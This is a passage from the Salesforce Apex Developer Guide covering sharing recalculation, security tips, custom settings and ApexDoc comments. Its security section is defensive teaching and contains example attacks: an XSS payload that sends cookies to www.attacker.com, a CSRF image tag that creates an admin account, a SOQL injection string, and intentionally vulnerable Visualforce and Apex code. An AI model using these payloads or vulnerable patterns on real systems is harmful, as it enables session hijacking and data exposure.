// Accesslevelsequalor morepermissivethanthe object'sdefault
// accesslevelare not allowed.
// Thesesharingrecordsare not requiredand thusan insertexception
// is acceptable.
if(!(err.getStatusCode()== StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION
&&  err.getMessage().contains('AccessLevel'))){
// Erroris not relatedto trivialaccesslevel.
// Sendan emailto the Apexjob'ssubmitter.
Messaging.SingleEmailMessagemail= new Messaging.SingleEmailMessage();
String[] toAddresses= new String[] {emailAddress};
mail.setToAddresses(toAddresses);
mail.setSubject('ApexSharingRecalculationException');
mail.setPlainTextBody(
'TheApexsharingrecalculationthrewthe followingexception:' +
err.getMessage());
Messaging.sendEmail(new Messaging.SingleEmailMessage[]{ mail});
}
}
}
} catch(DmlExceptione) {
// Sendan emailto the Apexjob'ssubmitteron failure.
Messaging.SingleEmailMessagemail= new Messaging.SingleEmailMessage();
String[] toAddresses= new String[] {emailAddress};
mail.setToAddresses(toAddresses);
mail.setSubject('ApexSharingRecalculationException');
mail.setPlainTextBody(
232
Working with Data in ApexApex Developer Guide

'TheApexsharingrecalculationthrewthe followingexception:' +
e.getMessage());
Messaging.sendEmail(new Messaging.SingleEmailMessage[]{ mail});
}
}
// The finishmethodis calledat the end of a sharingrecalculation.
globalvoidfinish(Database.BatchableContextBC){
// Sendan emailto the Apexjob'ssubmitternotifyingof job completion.
Messaging.SingleEmailMessagemail= new Messaging.SingleEmailMessage();
String[] toAddresses= new String[] {emailAddress};
mail.setToAddresses(toAddresses);
mail.setSubject('ApexSharingRecalculationCompleted.');
mail.setPlainTextBody
('TheApexsharingrecalculationfinishedprocessing');
Messaging.sendEmail(new Messaging.SingleEmailMessage[]{ mail});
}
}
Testing Apex Managed Sharing Recalculations
This example inserts five Job records and invokes the batch job that is implemented in the batch class of the previous example. This
example requires a custom object called Job, with two lookup fields associated with User records called Hiring_Manager and Recruiter.
Also, the Job custom object should have two sharing reasons added called Hiring_Manager and Recruiter. Before you run this test, set
the organization-wide default sharing for Job to Private. Note that since email messages aren’t sent from tests, and because the batch
class is invoked by a test method, the email notifications won’t be sent in this case.
@isTest
privateclassJobSharingTester{
// Testfor the JobSharingRecalcclass
statictestMethodvoidtestApexSharing(){
// Instantiatethe classimplementingthe Database.Batchableinterface.
JobSharingRecalcrecalc= new JobSharingRecalc();
// Selectusersfor the test.
List<User>users= [SELECTId FROMUserWHEREIsActive= trueLIMIT2];
ID User1Id= users[0].Id;
ID User2Id= users[1].Id;
// Insertsometestjob records.
List<Job__c>testJobs= new List<Job__c>();
for (Integeri=0;i<5;i++){
Job__cj = new Job__c();
j.Name= 'TestJob ' + i;
j.Recruiter__c= User1Id;
j.Hiring_Manager__c= User2Id;
testJobs.add(j);
}
inserttestJobs;
Test.startTest();
233
Working with Data in ApexApex Developer Guide

// Invokethe Batchclass.
StringjobId= Database.executeBatch(recalc);
Test.stopTest();
// Get the Apexjob and verifythereare no errors.
AsyncApexJobaaj = [SelectJobType,TotalJobItems,JobItemsProcessed,Status,
CompletedDate,CreatedDate,NumberOfErrors
fromAsyncApexJobwhereId = :jobId];
System.assertEquals(0,aaj.NumberOfErrors);
// Thisqueryreturnsjobsand relatedsharingrecordsthatwereinserted
// by the batchjob'sexecutemethod.
List<Job__c>jobs= [SELECTId, Hiring_Manager__c,Recruiter__c,
(SELECTId, ParentId,UserOrGroupId,AccessLevel,RowCauseFROMShares
WHERE(RowCause= :Schema.Job__Share.rowCause.Recruiter__cOR
RowCause= :Schema.Job__Share.rowCause.Hiring_Manager__c))
FROMJob__c];
// ValidatethatApexmanagedsharingexistson jobs.
for(Job__cjob : jobs){
// Two Apexmanagedsharingrecordsshouldexistfor eachjob
// whenusingthe Privateorg-widedefault.
System.assert(job.Shares.size()== 2);
for(Job__SharejobShr: job.Shares){
// Testthe sharingrecordfor hiringmanageron job.
if(jobShr.RowCause== Schema.Job__Share.RowCause.Hiring_Manager__c){
System.assertEquals(jobShr.UserOrGroupId,job.Hiring_Manager__c);
System.assertEquals(jobShr.AccessLevel,'Read');
}
// Testthe sharingrecordfor recruiteron job.
elseif(jobShr.RowCause== Schema.Job__Share.RowCause.Recruiter__c){
System.assertEquals(jobShr.UserOrGroupId,job.Recruiter__c);
System.assertEquals(jobShr.AccessLevel,'Edit');
}
}
}
}
}
Associating an Apex Class Used for Recalculation
An Apex class used for recalculation must be associated with a custom object.
To associate an Apex managed sharing recalculation class with a custom object:
1.From the management settings for the custom object, go to Apex Sharing Recalculations.
2.Choose the Apex class that recalculates the Apex sharing for this object. The class you choose must implement the
Database.Batchable interface. You cannot associate the same Apex class multiple times with the same custom object.
3.Click Save.
234
Working with Data in ApexApex Developer Guide

Security Tips for Apex and Visualforce Development
Understanding Security
The powerful combination of Apex and Visualforce pages allows Lightning Platform developers to provide custom functionality and
business logic to Salesforce or to create a new standalone product running inside the Lightning Platform. But as with any programming
language, developers must be cognizant of potential security-related pitfalls.
Salesforce has incorporated several security defenses in the Lightning Platform. But careless developers can still bypass the built-in
defenses and then expose their applications and customers to security risks. Many of the coding mistakes a developer can make on the
Lightning Platform are similar to general web application security vulnerabilities, while others are unique to Apex.
To certify an application for AppExchange, it’s important for developers to learn and understand the security flaws described. For more
information, see the Lightning Platform Security Resources page on Salesforce Developers. https://developer.salesforce.com/page/Security.
Open Redirects Through Static Resources
URL redirects automatically send a user to a different web page. Redirects are often used to guide navigation to a website, or refer
multiple domain names belonging to the same owner to refer to a single website. Unfortunately for developers, attackers can exploit
URL redirects when not implemented properly. Open redirect (also known as “arbitrary redirect”) is a common web application vulnerability
where values controlled by the user determine where the app redirects.
Warning:  Open redirects through static resources can expose users to the risk of unintended, and possibly malicious, redirects.
Only admins with “Customize Application” permissions can upload static resources within an organization. Admins with this permission
must use caution to ensure that static resources don’t contain malicious content. To learn how to help guard against static resources
that were obtained from third parties, see Referencing Untrusted Third-Party Content with iframes  .
Cross Site Scripting (XSS)
Unescaped Output and Formulas in Visualforce Pages
When using components that have set the escape attribute to false, or when including formulas outside of a Visualforce component,
output is unfiltered and must be validated for security. This is especially important when using formula expressions.
Cross-Site Request Forgery (CSRF)
SOQL Injection
Data Access Control
Cross Site Scripting (XSS)
Cross-site scripting (XSS) attacks are where malicious HTML or client-side scripting is provided to a web application. The web application
includes malicious scripting in a response to a user who unknowingly becomes the victim of the attack. The attacker uses the web
application as an intermediary in the attack, taking advantage of the victim's trust for the web application. Most applications that display
dynamic web pages without properly validating the data are likely to be vulnerable. Attacks against the website are especially easy if
input from one user is shown to another user. Some obvious possibilities include bulletin board or user comment-style websites, news,
or email archives.
For example, assume this script is included in a Lightning Platform page using a script component, an on* event, or a Visualforce page.
<script>var foo = '{!$CurrentPage.parameters.userparam}';</script>
235
Working with Data in ApexApex Developer Guide

This script block inserts the value of the user-supplied userparam onto the page. The attacker can then enter this value for
userparam.
1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2
In this case, all cookies for the current page are sent to www.attacker.com as the query string in the request to the cookie.cgi
script. At this point, the attacker has the victim's session cookie and can connect to the web application as if they were the victim.
The attacker can post a malicious script using a website or email. Web application users not only see the attacker's input, but their
browser can execute the attacker's script in a trusted context. With this ability, the attacker can perform a wide variety of attacks against
the victim. These attacks range from simple actions, such as opening and closing windows, to more malicious attacks, such as stealing
data or session cookies, which allow an attacker full access to the victim's session.
For more information on this type of attack:
•
http://www.owasp.org/index.php/Cross_Site_Scripting
•
http://www.cgisecurity.com/xss-faq.html
•
http://www.owasp.org/index.php/Testing_for_Cross_site_scripting
•
http://www.google.com/search?q=cross-site+scripting
Within the Lightning Platform, several anti-XSS defenses are in place. For example, Salesforce has filters that screen out harmful characters
in most output methods. For the developer using standard classes and output methods, the threats of XSS flaws are largely mitigated.
But the creative developer can still find ways to intentionally or accidentally bypass the default controls.
Existing Protection
All standard Visualforce components, which start with <apex>, have anti-XSS filters in place to screen out harmful characters. For
example, this code is normally vulnerable to an XSS attack because it takes user-supplied input and outputs it directly back to the user,
but the <apex:outputText> tag is XSS-safe. All characters that appear to be HTML tags are converted to their literal form. For
example, the < character is converted to &lt; so that a literal < appears on the user's screen.
<apex:outputText>
{!$CurrentPage.parameters.userInput}
</apex:outputText>
Disabling Escape on Visualforce Tags
By default, nearly all Visualforce tags escape the XSS-vulnerable characters. You can disable this behavior by setting the optional attribute
escape="false". For example, this output is vulnerable to XSS attacks.
<apex:outputTextescape="false"value="{!$CurrentPage.parameters.userInput}"/>
Programming Items Not Protected from XSS
Custom Javascript code and code within <apex:includeScript> components don’t have built-in XSS protections. These items
allow the developer to customize the page with script commands. It doesn’t makes sense to include anti-XSS filters on commands that
are intentionally added to a page.
If you write your own JavaScript, the Lightning Platform has no way to protect you. For example, this code is vulnerable to XSS if used
in JavaScript.
<script>
var foo = location.search;
236
Working with Data in ApexApex Developer Guide

document.write(foo);
</script>
With the <apex:includeScript> Visualforce component, you can include a custom script on a page. Make sure to validate that
the content is safe and includes no user-supplied data. For example, this snippet is vulnerable because it includes user-supplied input
as the value of the script text. The value provided by the tag is a URL to the JavaScript to include. If an attacker can supply arbitrary data
to this parameter as in the example, they’re able to direct the victim to include any JavaScript file from any other website.
<apex:includeScriptvalue="{!$CurrentPage.parameters.userInput}"/>
Unescaped Output and Formulas in Visualforce Pages
When using components that have set the escape attribute to false, or when including formulas outside of a Visualforce component,
output is unfiltered and must be validated for security. This is especially important when using formula expressions.
Formula expressions can be function calls or include information about platform objects, a user's environment, system environment,
and the request environment. It’s important to be aware that the output that’s generated by expressions isn’t escaped during rendering.
Since expressions are rendered on the server, it’s not possible to escape rendered data on the client using JavaScript or other client-side
technology. This can lead to potentially dangerous situations if the formula expression references non-system data (that is, potentially
hostile or editable data) and the expression itself is not wrapped in a function to escape the output during rendering.
A common vulnerability is created by rerendering user input on a page. For example,
<apex:pagestandardController="Account">
<apex:form>
<apex:commandButtonrerender="outputIt"value="UpdateIt"/>
<apex:inputTextvalue="{!myTextField}"/>
</apex:form>
<apex:outputPanelid="outputIt">
Valueof myTextFieldis <apex:outputTextvalue="{!myTextField}"escape="false"/>
</apex:outputPanel>
</apex:page>
The unescaped {!myTextField} results in a cross-site scripting vulnerability. For example, if the user enters :
<script>alert('xss')
and clicks Update It, the JavaScript is executed. In this case, an alert dialog is displayed, but more malicious uses could be designed.
There are several functions that you can use for escaping potentially insecure strings.
HTMLENCODE
Encodes text and merge field values for use in HTML by replacing characters that are reserved in HTML, such as the greater-than
sign (>), with HTML entity equivalents, such as &gt;.
JSENCODE
Encodes text and merge field values for use in JavaScript by inserting escape characters, such as a backslash (\), before unsafe
JavaScript characters, such as the apostrophe (').
JSINHTMLENCODE
Encodes text and merge field values for use in JavaScript inside HTML tags by replacing characters that are reserved in HTML with
HTML entity equivalents and inserting escape characters before unsafe JavaScript characters. JSINHTMLENCODE(someValue)
is a convenience function that is equivalent to JSENCODE(HTMLENCODE((someValue)). That is, JSINHTMLENCODE
first encodes someValue with HTMLENCODE, and then encodes the result with JSENCODE.
237
Working with Data in ApexApex Developer Guide

URLENCODE
Encodes text and merge field values for use in URLs by replacing characters that are illegal in URLs, such as blank spaces, with the
code that represent those characters as defined in RFC 3986, Uniform Resource Identifier (URI): Generic Syntax. For example, blank
spaces are replaced with %20, and exclamation points are replaced with %21.
To use HTMLENCODE to secure the previous example, change the <apex:outputText> to the following:
<apex:outputTextvalue=" {!HTMLENCODE(myTextField)}"escape="false"/>
If a user enters <script>alert('xss') and clicks Update It, the JavaScript is not be executed. Instead, the string is encoded
and the page displays Valueof myTextFieldis <script>alert('xss').
Depending on the placement of the tag and usage of the data, both the characters needing escaping as well as their escaped counterparts
may vary. For instance, this statement, which copies a Visualforce request parameter into a JavaScript variable:
<script>varret = "{!$CurrentPage.parameters.retURL}";</script>
requires that any double quote characters in the request parameter be escaped with the URL encoded equivalent of %22 instead of
the HTML escaped ". Otherwise, the request:
https://example.com/demo/redirect.html?retURL=%22foo%22%3Balert('xss')%3B%2F%2F
results in:
<script>varret = "foo";alert('xss');//";</script>
When the page loads the JavaScript executes, and the alert is displayed.
In this case, to prevent JavaScript from being executed, use the JSENCODE function. For example
<script>varret = "{!JSENCODE($CurrentPage.parameters.retURL)}";</script>
Formula tags can also be used to include platform object data. Although the data is taken directly from the user's organization, it must
still be escaped before use to prevent users from executing code in the context of other users (potentially those with higher privilege
levels). While these types of attacks must be performed by users within the same organization, they undermine the organization's user
roles and reduce the integrity of auditing records. Additionally, many organizations contain data which has been imported from external
sources and might not have been screened for malicious content.
Cross-Site Request Forgery (CSRF)
Cross-Site Request Forgery (CSRF) flaws are less a programming mistake and more a lack of a defense. For example, an attacker has a
web page at www.attacker.com that could be any web page, including one that provides valuable services or information that
drives traffic to that site. Somewhere on the attacker's page is an HTML tag that looks like this:
<img
src="http://www.yourwebpage.com/yourapplication/createuser?email=attacker@attacker.com&type=admin....."
height=1 width=1 />
In other words, the attacker's page contains a URL that performs an action on your website. If the user is still logged into your web page
when they visit the attacker's web page, the URL is retrieved and the actions performed. This attack succeeds because the user is still
authenticated to your web page. This attack is a simple example, and the attacker can get more creative by using scripts to generate
the callback request or even use CSRF attacks against your AJAX methods.
For more information and traditional defenses:
•
http://www.owasp.org/index.php/Cross-Site_Request_Forgery
•
http://www.cgisecurity.com/csrf-faq.html
238
Working with Data in ApexApex Developer Guide

•
http://shiflett.org/articles/cross-site-request-forgeries
Within the Lightning Platform, Salesforce implemented an anti-CSRF token to prevent such an attack. Every page includes a random
string of characters as a hidden form field. Upon the next page load, the application checks the validity of this string of characters and
doesn’t execute the command unless the value matches the expected value. This feature protects you when using all of the standard
controllers and methods.
Here again, the developer can bypass the built-in defenses without realizing the risk. For example, a custom controller takes the object
ID as an input parameter and then uses that input parameter in a SOQL call.
<apex:pagecontroller="myClass"action="{!init}"</apex:page>
publicclassmyClass{
publicvoidinit(){
Id id = ApexPages.currentPage().getParameters().get('id');
Accountobj = [selectid, NameFROMAccountWHEREid = :id];
deleteobj;
return;
}
}
The developer unknowingly bypassed the anti-CSRF controls by developing their own action method. The id parameter is read and
used in the code. The anti-CSRF token is never read or validated. An attacking web page can send the user to this page by using a CSRF
attack and providing any value for the id parameter.
There are no built-in defenses for such situations, and developers must be cautious about writing pages that act based on a user-supplied
parameter like the id variable in the previous example. A possible work-around is to insert an intermediate confirmation page to make
sure that the user intended to call the page. Other suggestions include shortening the idle session timeout and educating users to log
out of their active session and not use their browser to visit other sites while authenticated.
Because of the Salesforce built-in defense against CSRF, your users can encounter an error when multiple Salesforce login pages are
open. If the user logs in to Salesforce in one tab and then attempts to log in on another, they see this error: The page you submitted was
invalid for your session. Users can successfully log in by refreshing the login page or by attempting to log in a second time.
SOQL Injection
In other programming languages, the previous flaw is known as SQL injection. Apex doesn’t use SQL, but uses its own database query
language, SOQL. SOQL is simpler and more limited in functionality than SQL. The risks are lower for SOQL injection than for SQL injection,
but the attacks are nearly identical to traditional SQL injection. SQL/SOQL injection takes user-supplied input and uses those values in
a dynamic SOQL query. If the input isn’t validated, it can include SOQL commands that effectively modify the SOQL statement and trick
the application into performing unintended commands.
SOQL Injection Vulnerability in Apex
Here’s a simple example of Apex and Visualforce code vulnerable to SOQL injection.
<apex:pagecontroller="SOQLController">
<apex:form>
<apex:outputTextvalue="EnterName"/>
<apex:inputTextvalue="{!name}"/>
<apex:commandButtonvalue="Query"action="{!query}“/>
</apex:form>
</apex:page>
publicclassSOQLController{
publicStringname{
239
Working with Data in ApexApex Developer Guide

get { returnname;}
set { name= value;}
}
publicPageReferencequery(){
StringqryString= 'SELECTId FROMContactWHERE' +
'(IsDeleted= falseand Namelike\'%'+ name+ '%\')';
List<Contact> queryResult= Database.query(qryString);
System.debug('queryresultis ' + queryResult);
returnnull;
}
}
This simple example illustrates the logic. The code is intended to search for contacts that weren’t deleted. The user provides one input
value called name. The value can be anything provided by the user, and it’s never validated. The SOQL query is built dynamically and
then executed with the Database.query method. If the user provides a legitimate value, the statement executes as expected.
// Usersuppliedvalue:name= Bob
// Querystring
SELECTId FROMContactWHERE(IsDeleted= falseand Namelike'%Bob%')
But what if the user provides unexpected input, such as:
// Usersuppliedvaluefor name:test%')OR (NameLIKE'
In that case, the query string becomes:
SELECTId FROMContactWHERE(IsDeleted= falseAND NameLIKE'%test%')OR (NameLIKE'%')
Now the results show all contacts, not just the non-deleted ones. A SOQL Injection flaw can be used to modify the intended logic of any
vulnerable query.
SOQL Injection Defenses
To prevent a SOQL injection attack, avoid using dynamic SOQL queries. Instead, use static queries and binding variables. The preceding
vulnerable example can be rewritten using static SOQL.
publicclassSOQLController{
publicStringname{
get { returnname;}
set { name= value;}
}
publicPageReferencequery(){
StringqueryName= '%' + name+ '%';
List<Contact>queryResult= [SELECTId FROMContactWHERE
(IsDeleted= falseand Namelike:queryName)];
System.debug('queryresultis ' + queryResult);
returnnull;
}
}
If you must use dynamic SOQL, use the escapeSingleQuotes method to sanitize user-supplied input. This method adds the
escape character (\) to all single quotation marks in a string that is passed in from a user. The method ensures that all single quotation
marks are treated as enclosing strings, instead of database commands.
240
Working with Data in ApexApex Developer Guide

Data Access Control
The Lightning Platform makes extensive use of data sharing rules. Each object has permissions and can have sharing settings that users
can read, create, edit, and delete. These settings are enforced when using all standard controllers.
When using an Apex class, the built-in user permissions and field-level security restrictions aren’t respected during execution. The default
behavior is that an Apex class can read and update all data. Because these rules aren’t enforced, developers who use Apex must avoid
inadvertently exposing sensitive data that’s normally hidden behind user permissions, field-level security, or defaults. For example,
consider this Apex pseudo-code.
publicclasscustomController{
publicvoidread(){
Contactcontact= [SELECTid FROMContactWHEREName= :value];
}
}
In this case, all contact records are searched, even if the user currently logged in doesn’t have permission to view these records. The
solution is to use the qualifying keywords withsharing when declaring the class:
publicwithsharingclasscustomController{
. . .
}
The withsharing keyword directs the platform to use the security sharing permissions of the user currently logged in, rather than
granting full access to all records.
Custom Settings
Custom settings are similar to custom objects. Application developers can create custom sets of data and associate custom data for an
organization, profile, or specific user. All custom settings data is exposed in the application cache, which enables efficient access without
the cost of repeated queries to the database. Formula fields, validation rules, flows, Apex, and SOAP API can then use this data.
Warning:  Protection only applies to custom settings that are marked protected and installed to a subscriber organization as part
of a managed package. Otherwise, they are treated as public custom settings and are readable for all profiles, including the guest
user. Do not store secrets, personally identifying information, or any private data in these settings. Use protected custom settings
only in managed packages. Outside of a managed package, use named credentials or encrypted custom fields to store secrets like
OAuth tokens, passwords, and other confidential material.
Note:  While custom settings data is included in sandbox copies, it is treated as data for the purposes of Apex test isolation. Apex
tests must use SeeAllData=true to see existing custom settings data in the organization. As a best practice, create the
required custom settings data in your test setup.
There are two types of custom settings.
List Custom Settings
A type of custom setting that provides a reusable set of static data that can be accessed across your organization. If you use a particular
set of data frequently within your application, putting that data in a list custom setting streamlines access to it. Data in list settings
doesn’t vary with profile or user, but is available organization-wide. Examples of list data include two-letter state abbreviations,
international dialing prefixes, and catalog numbers for products. Because the data is cached, access is low-cost and efficient: you
don't have to use SOQL queries that count against your governor limits.
Hierarchy Custom Settings
A type of custom setting that uses a built-in hierarchical logic that lets you “personalize” settings for specific profiles or users. The
hierarchy logic checks the organization, profile, and user settings for the current user and returns the most specific, or “lowest,” value.
In the hierarchy, settings for an organization are overridden by profile settings, which, in turn, are overridden by user settings.
241
Working with Data in ApexApex Developer Guide

To get custom setting data set record based on the lowest level fields defined in the hierarchy, use the getinstance() instance
method for hierarchy custom settings.
The following examples illustrate how you can use custom settings.
•
A shipping application requires users to fill in the country codes for international deliveries. By creating a list setting of all country
codes, users have quick access to this data without needing to query the database.
•
An application displays a map of account locations, the best route to take, and traffic conditions. This information is useful for sales
reps, but account executives only want to see account locations. By creating a hierarchy setting with custom checkbox fields for
route and traffic, you can enable this data for just the “Sales Rep” profile.
You can create a custom setting in the Salesforce user interface: from Setup, enter CustomSettings in the Quick Find box, then
select Custom Settings. After creating a custom setting and you’ve added fields, provide data to your custom setting by clicking Manage
from the detail page. Identify each data set with a name.
For example, if you have a custom setting named Foundation_Countries__c with one text field Country_Code__c, your data sets can
look like the following:
Country Code Field ValueData Set Name
USAUnited States
CANCanada
GBRUnited Kingdom
You can also include a custom setting in a package. The visibility of the custom setting in the package depends on the Visibility
setting.
Note:  Only custom settings definitions are included in packages, not data. To include data, you must populate the custom settings
using Apex code run by the subscribing organization after they’ve installed the package.
Apex can access both custom setting types—list and hierarchy.
Note:  If Privacy for a custom setting is Protected and the custom setting is contained in a managed package, the subscribing
organization can’t edit the values or access them using Apex.
Accessing a List Custom Setting
The following example returns a map of custom settings data. The getAll method returns values for all custom fields associated with
the list setting.
Map<String_dataset_name,CustomSettingName__c>mcs =CustomSettingName__c.getAll();
The following example uses the getValues method to return all the field values associated with the specified data set. This method
can be used with both list and hierarchy custom settings, using different parameters.
CustomSettingName__c mc =CustomSettingName__c.getValues(data_set_name);
Accessing a Hierarchy Custom Setting
The following example uses the getOrgDefaults method to return the data set values for the organization level:
CustomSettingName__c mc =CustomSettingName__c.getOrgDefaults();
242
Working with Data in ApexApex Developer Guide

The following example uses the getInstance method to return the data set values for the specified profile. The getInstance
method can also be used with a user ID.
CustomSettingName__c mc =CustomSettingName__c.getInstance(Profile_ID);
SEE ALSO:
Apex Reference Guide: Custom Settings Methods
Document Your Apex Code
ApexDoc is a standardized comment format that makes it easier for humans, documentation generators, and AI agents to understand
your codebase. We recommend using ApexDoc comments to facilitate code collaboration and increase long-term code maintainability.
Based on the JavaDoc standard, ApexDoc provides specifications, such as specialized tags and guidelines, that are tailored to Apex and
the Salesforce ecosystem.
ApexDoc Comment Structure and Tags
To promote consistency and parsability, ApexDoc comments have a defined structure and syntax. Each ApexDoc comment consists
of a main description and a set of block and inline tags that provide information about the documented code element.
Document Apex Constructs and Features
Apex has unique constructs and platform-specific features that require particular attention in documentation. Use these guidelines
to document these elements with ApexDoc.
ApexDoc Examples
See practical examples of ApexDoc comments applied to various Apex constructs.
ApexDoc Comment Structure and Tags
To promote consistency and parsability, ApexDoc comments have a defined structure and syntax. Each ApexDoc comment consists of
a main description and a set of block and inline tags that provide information about the documented code element.
Important: Although the Apex compiler enforces existing Apex comment syntax on page 49, it doesn’t enforce the ApexDoc
syntax or check comment accuracy in relation to corresponding Apex code.
Basic Comment Format
ApexDoc comments are distinguished from other Apex comments on page 49 by their starting delimiter. Whereas other multiline
comments demarcate the beginning and end of the comment block with /* and */, ApexDoc comments begin with /** and end
with */.
An ApexDoc comment immediately precedes the class, interface, enum, method, constructor, or property declaration that it documents.
No other code or comments are between the ApexDoc comment block and the element that it describes.
If an ApexDoc comment spans multiple lines, each subsequent line begins with an asterisk (*). Documentation parsers ignore the leading
asterisk and any whitespace that precedes it on the line.
/**
* Thisis a simpleApexDoccomment.
*/
publicwithsharingclassMyClass{
243
Document Your Apex CodeApex Developer Guide

//...
}
Main Description
The main description is the first block of text within an ApexDoc comment. It doesn’t have an explicit tag. It provides a concise summary
of the documented element.
In the main description, first include a one-sentence summary of the element. Documentation generation tools often extract this first
sentence to use in summary tables or indexes. End the summary sentence with a period.
After the summary sentence, include any additional context about the element. For example, explain pre- or post- conditions, link to
relevant documents, or describe variable constraints.
Block and Inline Tags
Block tags and inline tags provide structured information about the element.
Use block tags after the main description of the ApexDoc comment. Block tags begin with the @ symbol followed by the tag name,
such as @param, @return, and @author. Each block tag appears on a new line, and the information associated with a block tag
follows the tag name on the same line or subsequent lines.
Use inline tags within the main description or within the description of a block tag. Inline tags also begin with the @ symbol followed
by the tag name, but the tags are enclosed in curly braces ({@...}).
This table provides a comprehensive ApexDoc tag reference.
Table 3: ApexDoc Tags
Description and ExampleApplicable Apex ElementsTag
Specifies the author or authors of the element code. Multiple
@author tags are allowed.
* @authorMarieHill
* @authorBen Stuar
Class, Interface, Enum@authorvalue
Marks an element as deprecated. In the tag description, provide a
reason and an alternative.
* @deprecatedin 1.3.2.
* Use {@link#newFieldName}instead.
All@deprecated
description
Provides a usage example. The example is formatted as code if the
{@code... } inline tag is used.
* @example
* {@code
All@exampleexample
* Accounta;
* try {
*  a = new
AccountManager().createAccount('Acme',
'Agriculture');
* } catch(AccountManager.AccountException
caught){
*   LOGGER.log(caught);
244
Document Your Apex CodeApex Developer Guide

Description and ExampleApplicable Apex ElementsTag
*   // furtherexceptionhandling
* }
* }
Specifies the element’s group in documentation. Grouping
elements is useful for generated documentation.
* @groupAccount
Class, Interface, Enum, Method,
Property, Variable
@groupgroupName
Describes a method or constructor parameter. It must match the
parameter order and name.
* @paramaccountNameThe desirednamefor
the new
* account.Cannotbe nullor empty.
Method, Constructor@paramparamName
Describes the return value of a method. Don’t use the @return
tag for void methods or constructors.
* @returnThe newlycreatedAccountsObject
withits
* ID populated.
Method@returndescription
Adds a reference in the See Also section of the documentation.
All@seereference
The @see tag allows these syntaxes.
•
@seeclass#member
•
@see"text-string"
•
@see<a href="URL">label</a>
For the @seeclass#member syntax:
class—The fully-qualified name of the class or interface that
you want to link to.
#member—The specific member within a class that you want to
link to. For example,
•
For fields or properties, use #fieldName.
•
For constructors, use #ClassName(parameterTypes).
•
For methods, use #methodName(parameterTypes).
The parameterTypes are important to distinguish
overloaded methods. Use the fully-qualified name for the
parameter types if they’re from a different package.
* @seeGeolocationService#GeocodingException
245
Document Your Apex CodeApex Developer Guide

Description and ExampleApplicable Apex ElementsTag
Indicates the version or date that the element was introduced. This
tag is particularly useful for package authors.
* @since0.1.0
All@sincevalue
Documents an exception that can be thrown.
* @throwsAccountManager.AccountException
if
Method, Constructor@throwsexceptionType
description
* accountNameis invalidor if DML operation
fails.
Specifies the version of the element.
* @version0.2.0
Class, Interface, Enum@versionvalue
Formats comment text as inline code.
* {@code
* Accounta;
ApexDoc comment{@codetext}
* try {
*  a = new
AccountManager().createAccount('Acme',
'Agriculture');
* } catch(AccountManager.AccountException
caught){
*   LOGGER.log(caught);
*   // furtherexceptionhandling
* }
* }
Prevents an element from appearing in generated docs.
* {@hiddenNOTETO MAINTAINERS:Updatethis
method
All{@hiddentext}
* if new securitythreatsare identified.
* The currentregexis designedto handle
commonXSS
* patternsbut may not be exhaustive.
* The lastmajorupdatewas in v2.1.}
Creates an inline link to another element.
The @link tag allows these syntaxes.
ApexDoc comment{@linkreference}
•
@linkclass#member
•
@link"text-string"
•
@link<a href="URL">label</a>
For the @linkclass#member syntax:
class—The fully-qualified name of the class or interface that
you want to link to.
246
Document Your Apex CodeApex Developer Guide

Description and ExampleApplicable Apex ElementsTag
#member—The specific member within a class that you want to
link to. For example,
•
For fields or properties, use #fieldName.
•
For constructors, use #ClassName(parameterTypes).
•
For methods, use #methodName(parameterTypes).
The parameterTypes are important to distinguish
overloaded methods. Use the fully-qualified name for the
parameter types if they’re from a different package.
* Populatedafterusingthe {@link
AccountService}.
Shows text literally without HTML tag interpretation.
* Thisstringmightcontainmaliciousor
unexpectedcharacters,
ApexDoc comment{@literaltext}
* likea {@literal<script>}tag or a
backslash{@literal\}.
SEE ALSO:
Document Apex Constructs and Features
ApexDoc Examples
Document Apex Constructs and Features
Apex has unique constructs and platform-specific features that require particular attention in documentation. Use these guidelines to
document these elements with ApexDoc.
Classes
When you document an Apex class on page 61, provide a comprehensive overview of the class’s purpose, responsibilities, and key
characteristics.
In the summary sentence, describe the class’s overall purpose. After the summary sentence, explain the rationale for the class’s sharing
model on page 89 if it’s not obvious. For example, explain why the class uses withoutsharing for a specific privileged operation.
We also recommend using tags such as @author, @version, @since, @see, and @group, which all provide valuable metadata.
Here’s an example ApexDoc comment for the DataAggregationService class.
/**
* Thisserviceclasshandlescriticaldataaggregationtasks.
* It operatesusing'withoutsharing'to ensureaccessto all necessary
* recordsfor calculation,irrespectiveof the runninguser'ssharingrules.
* Caremustbe takenwhencallingmethodsfromthisclass.
* @authorJaneDoe
* @since0.1.0
*/
publicwithoutsharingclassDataAggregationService{
247
Document Your Apex CodeApex Developer Guide

//...
}
Interfaces
Apex interfaces on page 81 define a contract for what other classes can do without specifying how they do it. Focus your ApexDoc
comments on this contract. In the main description, document the interface’s overall purpose and the contract that it defines. Standard
metadata tags such as @author, @version, @since, and @see are also applicable.
Document each method declaration in the interface as a standard method. Clearly explain the method’s expected behavior, parameters,
and return values. This documentation sets expectations for any class that implements the interface.
For an example of an interface with an ApexDoc comment, see ApexDoc Examples on page 250.
Enums
Enums  on page 33 in Apex define an abstract data type with a finite set of named constant values. In the main description, document
the enum’s purpose and the set of concepts that it represents. You can also use standard tags such as @author, @version, @since,
and @see.
Clarify individual enum constants if their names aren’t self-explanatory. Either describe a constant’s definition in the enum type’s ApexDoc
main description, or use standard block comments that directly precede the line for the constant.
Apex enums implicitly include methods such as values(), valueOf(String), name(), and ordinal(). These standard
methods generally don’t require explicit documentation within each specific enum’s ApexDoc comment.
Here’s an example ApexDoc comment for the Season enum.
/**
* Potentialseasonsof the year
*/
publicenumSeason{
WINTER,
SPRING,
SUMMER,
FALL
}
Methods and Constructors
Method on page 64 and constructor on page 67 documentation is critical for understanding how to use an Apex class.
When you document method and constructor parameters, use the @param block tag. Each parameter must have a corresponding
@param tag. In the parameter description, describe the parameter’s name, its purpose, and any expectations regarding its type or
content. Descriptions can include statements such as “Cannot be null” or “A valid 18-character ID”.
For methods that return values, use the @return block tag. In the description, specify what is returned, including conditions for null
values or specific data structures. Descriptions can include statements such as “A List of Account sObjects matching the filter criteria; an
empty list if no matches are found.”
Use the @throws block tag to list all significant checked and unchecked exceptions that the method can explicitly throw, along with
the conditions causing them. This documentation is crucial for identifying gaps in error handling.
For examples of methods and constructors with ApexDoc comments, see ApexDoc Examples on page 250.
248
Document Your Apex CodeApex Developer Guide

Properties and Variables
Document public or global properties and class member variables that form part of a class’s public API.
In the ApexDoc comment’s main description section, explain the property’s purpose, its data type if it’s unclear from the method
